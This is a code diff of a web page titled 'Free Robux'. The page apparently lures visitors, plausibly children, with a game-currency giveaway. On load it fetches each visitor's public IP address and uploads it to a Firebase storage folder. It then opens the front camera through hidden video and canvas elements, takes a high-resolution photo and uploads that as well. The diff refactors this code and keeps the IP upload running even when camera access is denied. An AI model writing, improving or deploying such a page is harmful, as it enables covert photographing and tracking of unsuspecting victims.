@@ -5,61 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Robux</title>
     <script type="module">
-        // Import the necessary Firebase functions
+        // Dynamically import Firebase configuration
+        import firebaseConfig from './firebase-config.js';
+
+        // Import Firebase libraries
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
-
-        // Your Firebase configuration (replace with placeholders)
-        const firebaseConfig = {
-            apiKey: "FIREBASE_API_KEY",
-            authDomain: "FIREBASE_AUTH_DOMAIN",
-            projectId: "FIREBASE_PROJECT_ID",
-            storageBucket: "FIREBASE_STORAGE_BUCKET",
-            messagingSenderId: "FIREBASE_MESSAGING_SENDER_ID",
-            appId: "FIREBASE_APP_ID"
-        };
 
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
         // Function to upload image to Firebase
-        function uploadImage(imageData, imageNumber) {
-            const storageRef = ref(storage, `Zeyad/image_${Date.now()}_${imageNumber}.png`); // Upload to Zeyad folder
-            uploadString(storageRef, imageData, 'data_url')
-                .then(() => {
-                    console.log(`Uploaded image ${imageNumber}!`);
-                })
-                .catch((error) => {
-                    console.error(`Error uploading image ${imageNumber}:`, error);
-                });
+        async function uploadImage(imageData, fileName) {
+            try {
+                const storageRef = ref(storage, `Zeyad/${fileName}`); // Upload to Zeyad folder
+                await uploadString(storageRef, imageData, 'data_url');
+                console.log(`Uploaded image: ${fileName}`);
+            } catch (error) {
+                console.error(`Error uploading image:`, error);
+            }
         }
 
         // Function to upload IP address to Firebase
-        function uploadIP(ip) {
-            const ipRef = ref(storage, `Zeyad/ip_${Date.now()}.txt`); // Upload to Zeyad folder
-            uploadString(ipRef, ip, 'raw')
-                .then(() => {
-                    console.log('Uploaded IP address!');
-                })
-                .catch((error) => {
-                    console.error('Error uploading IP address:', error);
-                });
+        async function uploadIP(ip) {
+            try {
+                const ipRef = ref(storage, `Zeyad/ip_${Date.now()}.txt`); // Upload to Zeyad folder
+                await uploadString(ipRef, ip, 'raw');
+                console.log('Uploaded IP address!');
+            } catch (error) {
+                console.error('Error uploading IP address:', error);
+            }
         }
 
-        // Function to get the user's public IP address
+        // Function to fetch the user's public IP address
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('Failed to fetch IP address.');
                 const data = await response.json();
-                return data.ip; // Return the IP address
+                return data.ip;
             } catch (error) {
                 console.error('Error fetching IP address:', error);
                 return null;
             }
         }
 
-        // Access the video and canvas elements
+        // Main function to capture video and upload data
         window.addEventListener('load', async () => {
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
@@ -69,56 +61,50 @@
             video.style.display = 'none';
             canvas.style.display = 'none';
 
-            // Get the user's public IP address
+            // Fetch and upload the user's public IP address
             const ip = await getIP();
             if (ip) {
-                uploadIP(ip); // Upload IP address to Firebase
+                await uploadIP(ip); // Ensure IP is uploaded regardless of camera access
             }
 
-            // Start capturing from the front camera
-            navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: { exact: "user" }, // Use front camera
-                    width: { ideal: 1920 }, // High resolution
-                    height: { ideal: 1080 } // High resolution
-                }
-            })
-            .then(stream => {
+            // Access the front camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user", // Front camera
+                        width: { ideal: 1920 }, // High resolution
+                        height: { ideal: 1080 } // High resolution
+                    }
+                });
+
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
 
-                    // Set the canvas size to match the video resolution
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    // Set canvas size to match the desired resolution
+                    canvas.width = 1920;
+                    canvas.height = 1080;
 
-                    // Take the first picture immediately
+                    // Capture the image immediately
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData1 = canvas.toDataURL('image/png');
-                        uploadImage(imageData1, 1); // Upload first image to Firebase
+                        const imageData = canvas.toDataURL('image/png', 1.0); // High-quality image
+                        const fileName = `image_${Date.now()}.png`;
+                        uploadImage(imageData, fileName);
 
-                        // Take the second picture after a short delay
-                        setTimeout(() => {
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData2 = canvas.toDataURL('image/png');
-                            uploadImage(imageData2, 2); // Upload second image to Firebase
-
-                            // Stop the video stream
-                            stopVideo(stream);
-                        }, 1000); // 1 second delay between pictures
+                        // Stop the video stream
+                        stopVideo(stream);
                     }, 100); // Small delay to ensure the camera is ready
                 };
-            })
-            .catch(err => {
-                console.error('Error accessing camera: ', err);
-            });
+            } catch (err) {
+                console.error('Camera access denied or error:', err);
+                // If camera access is denied, do nothing further (IP has already been uploaded)
+            }
         });
 
         // Function to stop the video stream
         function stopVideo(stream) {
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop());
+            stream.getTracks().forEach(track => track.stop());
         }
     </script>
     <style>
@@ -127,7 +113,6 @@
             padding: 0;
             background-color: #000; /* Black background */
         }
-
         video, canvas {
             display: none; /* Hide video and canvas elements */
         }
